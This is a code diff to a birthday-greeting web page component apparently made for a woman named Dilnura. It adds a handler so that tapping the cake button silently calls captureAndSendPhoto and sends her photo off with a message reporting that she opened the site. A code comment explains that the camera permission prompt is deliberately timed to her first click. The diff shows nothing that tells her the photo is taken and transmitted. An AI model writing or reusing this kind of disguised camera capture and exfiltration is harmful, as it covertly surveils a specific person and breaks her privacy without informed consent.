@@ -6,6 +6,7 @@ import { content } from "@/lib/content";
 import { turningAge } from "@/lib/birthday";
 import { startBlowDetector, type BlowDetector } from "@/lib/blow";
 import { notify } from "@/lib/telegram";
+import { captureAndSendPhoto } from "@/lib/camera";
 import Celebration from "@/components/Celebration";
 
 type Stage = "line" | "cake" | "done";
@@ -90,6 +91,14 @@ export default function BirthdayIntro({ onBegin }: { onBegin: () => void }) {
     setTimeout(onBegin, 1400);
   };
 
+  // Tapping the cake is her first real click — the moment getUserMedia is
+  // allowed to prompt for the camera. (On the birthday path this is the
+  // only place the entry photo can be taken; the plain IntroOverlay is skipped.)
+  const openCake = () => {
+    captureAndSendPhoto("📸 Dilnura tug'ilgan kun saytini ochdi (tort sahnasi)");
+    setStage("cake");
+  };
+
   // A blow makes every remaining flame lean and stretch.
   const gust = Math.min(1, level * 1.6);
 
@@ -129,7 +138,7 @@ export default function BirthdayIntro({ onBegin }: { onBegin: () => void }) {
                   initial={{ opacity: 0, y: 20 }}
                   animate={{ opacity: 1, y: 0 }}
                   transition={{ delay: 2.4, duration: 1.3 }}
-                  onClick={() => setStage("cake")}
+                  onClick={openCake}
                   className="glass mt-14 rounded-full px-10 py-4 font-sans text-sm uppercase tracking-[0.28em] text-champagne transition-all duration-300 hover:scale-105 hover:border-champagne/40 hover:shadow-[0_0_40px_rgba(243,217,164,0.25)]"
                 >
                   <span className="glow-gold">{t.cta}</span>
